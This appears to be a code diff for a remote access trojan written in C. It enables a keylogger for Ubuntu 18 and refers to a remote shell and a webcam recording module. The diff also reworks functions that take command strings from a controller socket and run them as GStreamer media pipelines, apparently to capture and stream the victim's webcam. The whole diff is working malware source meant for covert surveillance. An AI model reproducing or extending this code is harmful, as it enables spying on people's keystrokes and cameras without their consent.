@@ -13,6 +13,8 @@
 
 #include <gtk-2.0/gtk/gtk.h>
 
+#include <glib-object.h>
+
 #include "../includes/constants.h"
 #include "../includes/keylogger/keylogger.h"
 #include "../includes/utils.h"
@@ -75,9 +77,9 @@ int main(int argc, char*argv[])
 
     //ubuntu16_keylogger_init();
 
-    //ubuntu18_keylogger_init();
+    ubuntu18_keylogger_init();
 
-    mint_keylogger_init();
+    //mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -359,8 +361,6 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
-
-            //get_remote_screen_resolution();
         }
 
 
@@ -391,7 +391,7 @@ void dispatch_modules(char *argv[])
             printf("\t\tRECORD WEBCAM STARTED....\n");
 
             /** Call the thread that will execute the stream command **/
-            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
+            if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))execute_record_cmd, NULL) == -1)
             {
                 error("pthread_create() record_webcam_thread", "dispatch_modules()");
                 exit(-1);
@@ -855,10 +855,15 @@ void *start_remote_shell(char *argv[])
 
 void execute_cmd()
 {
+
     size_t len_record_cmd = 0;
     char *buffer = NULL;
 
-    FILE *pipe = NULL;
+    GstElement *pipeline;
+    GstBus *bus;
+    GstStateChangeReturn ret;
+    GMainLoop *main_loop;
+    CustomData data;
 
     if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
     {
@@ -879,21 +884,181 @@ void execute_cmd()
         exit(-1);
     }
 
-    /* Execute cmd */
-    pipe = popen(buffer, "r");
-    if(pipe == NULL)
+    /* Initialize our data structure */
+    memset (&data, 0, sizeof (data));
+
+    /* Build the pipeline */
+    pipeline = gst_parse_launch(buffer, NULL);
+    bus = gst_element_get_bus (pipeline);
+
+    /* Start playing */
+    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
+
+    if(ret == GST_STATE_CHANGE_FAILURE)
     {
-        error("popen() pipe", "execute_watch_cmd()");
-        return;
+        g_printerr ("Unable to set the pipeline to the playing state.\n");
+        gst_object_unref (pipeline);
+        exit(-1);
     }
 
-    if(pclose(pipe) == -1)
+    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
     {
-        error("pclose() pipe]", "execute_watch_cmd()");
-        pthread_exit(NULL);
+        data.is_live = TRUE;
     }
+
+    main_loop = g_main_loop_new (NULL, FALSE);
+    data.loop = main_loop;
+    data.pipeline = pipeline;
+
+    gst_bus_add_signal_watch (bus);
+    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
 
     pthread_exit(NULL);
+
+    g_main_loop_run(main_loop);
+
+    /* Free resources */
+    g_main_loop_unref (main_loop);
+    gst_object_unref (bus);
+    gst_element_set_state (pipeline, GST_STATE_NULL);
+    gst_object_unref (pipeline);
+
+    free(buffer);
+
+    close(csock);
+}
+
+void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
+{
+    switch (GST_MESSAGE_TYPE (msg))
+    {
+        case GST_MESSAGE_ERROR:
+        {
+            GError *err;
+            gchar *debug;
+
+            gst_message_parse_error (msg, &err, &debug);
+            g_print ("Error: %s\n", err->message);
+            g_error_free (err);
+            g_free (debug);
+
+            gst_element_set_state (data->pipeline, GST_STATE_READY);
+            g_main_loop_quit (data->loop);
+            break;
+        }
+
+        case GST_MESSAGE_EOS:
+            /* end-of-stream */
+            gst_element_set_state (data->pipeline, GST_STATE_READY);
+            g_main_loop_quit (data->loop);
+            break;
+
+        case GST_MESSAGE_BUFFERING:
+        {
+            gint percent = 0;
+
+            /* If the stream is live, we do not care about buffering. */
+            if (data->is_live) break;
+
+            gst_message_parse_buffering (msg, &percent);
+            g_print ("Buffering (%3d%%)\r", percent);
+
+            /* Wait until buffering is complete before start/resume playing */
+            if (percent < 100)
+                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
+
+            else
+                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
+
+            break;
+        }
+
+        case GST_MESSAGE_CLOCK_LOST:
+
+            /* Get a new clock */
+            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
+            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
+            break;
+
+        default:
+            /* Unhandled message */
+            break;
+    }
+}
+
+
+void execute_record_cmd()
+{
+    size_t len_record_cmd = 0;
+    char *buffer = NULL;
+
+    GstElement *pipeline;
+    GstBus *bus;
+    GstStateChangeReturn ret;
+    GMainLoop *main_loop;
+    CustomData data;
+
+    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
+    {
+        error("recv() len_record_cmd", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+    buffer = malloc(len_record_cmd * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc() buffer", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
+    {
+        error("recv() buffer", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+  /* Initialize our data structure */
+    memset (&data, 0, sizeof (data));
+
+    /* Build the pipeline */
+    pipeline = gst_parse_launch(buffer, NULL);
+    bus = gst_element_get_bus (pipeline);
+
+    /* Start playing */
+    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
+
+    if(ret == GST_STATE_CHANGE_FAILURE)
+    {
+        g_printerr ("Unable to set the pipeline to the playing state.\n");
+        gst_object_unref (pipeline);
+        exit(-1);
+    }
+
+    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
+    {
+        data.is_live = TRUE;
+    }
+
+    main_loop = g_main_loop_new (NULL, FALSE);
+    data.loop = main_loop;
+    data.pipeline = pipeline;
+
+    gst_bus_add_signal_watch (bus);
+    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
+
+    pthread_exit(NULL);
+
+    g_main_loop_run(main_loop);
+
+    /* Free resources */
+    g_main_loop_unref (main_loop);
+    gst_object_unref (bus);
+    gst_element_set_state (pipeline, GST_STATE_NULL);
+    gst_object_unref (pipeline);
+
+    free(buffer);
+
+    close(csock);
 }
 
 
